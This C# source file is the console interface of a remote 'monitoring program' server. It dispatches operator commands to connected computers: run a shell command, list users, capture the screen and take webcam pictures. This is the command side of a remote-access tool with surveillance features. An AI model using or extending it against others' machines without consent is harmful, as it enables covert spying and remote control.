using Core;
using DotNetty.Transport.Channels;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Server
{
    /// <summary>
    /// 命令行界面
    /// </summary>
    public class MonitorUI
    {
        /// <summary>
        /// 循环
        /// </summary>
        public static void Loop(MonitorContext ctx)
        {
            PrintHead();

            while (true)
            {
                string input = Console.ReadLine();
                var inputArray = input.Split(" ");
                string cmd = inputArray[0];
                string parameter = input.Replace(cmd, string.Empty).Trim();
                switch (cmd)
                {
                    case "remote":
                        ExecuteCmdUI(ctx, parameter);
                        break;
                    case "users":
                        ShowUsers(ctx, parameter);
                        break;
                    case "screen":
                        GetScreenUI(ctx, parameter);
                        break;
                    case "camera":
                        GetCameraUI(ctx, parameter);
                        break;
                    case "version":
                        PrintVersion(ctx);
                        break;
                    case "help":
                        PrintHelp();
                        break;
                    default:
                        Console.WriteLine("没有此命令,请使用[help]命令");
                        break;
                }
            }
        }

        public static void PrintHead()
        {
            Console.WriteLine("=============================================================");
            Console.WriteLine("    感谢使用监控程序服务端(copyright@2019)");
            Console.WriteLine("    作者: lazy");
            Console.WriteLine("=============================================================");
        }

        /// <summary>
        /// 手册
        /// </summary>
        public static void PrintHelp()
        {
            Console.WriteLine("=============================================================");
            Console.WriteLine(">version: 程序版本");
            Console.WriteLine(">users -num: 查看所有的用户信息");
            Console.WriteLine("\t num: 获取的数量");
            Console.WriteLine(">remote id cmd: 执行远程计算机上的命令,id可以通过uses命令获取,cmd计算机的shell");
            Console.WriteLine(">screen id: 获取远程计算机上屏幕截图");
            Console.WriteLine(">camera id: 获取远程计算机上拍摄图片");
            Console.WriteLine("=============================================================");
        }

        /// <summary>
        /// 版本
        /// </summary>
        public static void PrintVersion(MonitorContext ctx)
        {
            Console.WriteLine(ctx.Config.Version);
        }



        /// <summary>
        /// remote id cmd
        /// </summary>
        /// <param name="ctx"></param>
        /// <param name="parameter"></param>
        public static void ExecuteCmdUI(MonitorContext ctx, string parameter)
        {
            var parameterArray = parameter.Split(" ");
            int.TryParse(parameterArray[0], out int id);
            var session = ctx.SessionGroup.Find(id);
            if (session == null)
            {
                Console.WriteLine("未找到用户");
                return;
            }

            MonitorEntity entity = new MonitorEntity()
            {
                CMD = (int)MonitorTriggerType.EXECUTECMD,
                Body = parameter.Replace(parameterArray[0], string.Empty).Trim()
            };
            session.Context.WriteAndFlushAsync(MonitorSerializer.Serialize(entity));
        }


        public static void ShowUsers(MonitorContext ctx, string parameter)
        {
            List<MonitorSession> selectSession = null;

            if (string.IsNullOrWhiteSpace(parameter))
            {
                selectSession = ctx.SessionGroup.SessionGroup;
            }
            else
            {
                if (int.TryParse(parameter, out int len))
                {
                    selectSession = ctx.SessionGroup.SessionGroup.Take(len).ToList();
                }
                else
                {
                    selectSession = ctx.SessionGroup.SessionGroup;
                }
            }

            selectSession.ForEach((item) => {
                Console.WriteLine(item.ToString());
            });
        }


        /// <summary>
        /// sceen id
        /// </summary>
        /// <param name="ctx"></param>
        /// <param name="parameter"></param>
        public static void GetScreenUI(MonitorContext ctx, string parameter)
        {
            var parameterArray = parameter.Split(" ");
            int.TryParse(parameterArray[0], out int id);
            var session = ctx.SessionGroup.Find(id);
            if (session == null)
            {
                Console.WriteLine("未找到用户");
                return;
            }

            MonitorEntity entity = new MonitorEntity()
            {
                CMD = (int)MonitorTriggerType.GETFULLSCREEN,
                Body = string.Empty
            };
            session.Context.WriteAndFlushAsync(MonitorSerializer.Serialize(entity));
        }



        /// <summary>
        /// camera id
        /// </summary>
        /// <param name="ctx"></param>
        /// <param name="parameter"></param>
        public static void GetCameraUI(MonitorContext ctx, string parameter)
        {
            var parameterArray = parameter.Split(" ");
            int.TryParse(parameterArray[0], out int id);
            var session = ctx.SessionGroup.Find(id);
            if (session == null)
            {
                Console.WriteLine("未找到用户");
                return;
            }

            MonitorEntity entity = new MonitorEntity()
            {
                CMD = (int)MonitorTriggerType.STARTCAPTURE,
                Body = string.Empty
            };
            session.Context.WriteAndFlushAsync(MonitorSerializer.Serialize(entity));
        }

    }
}
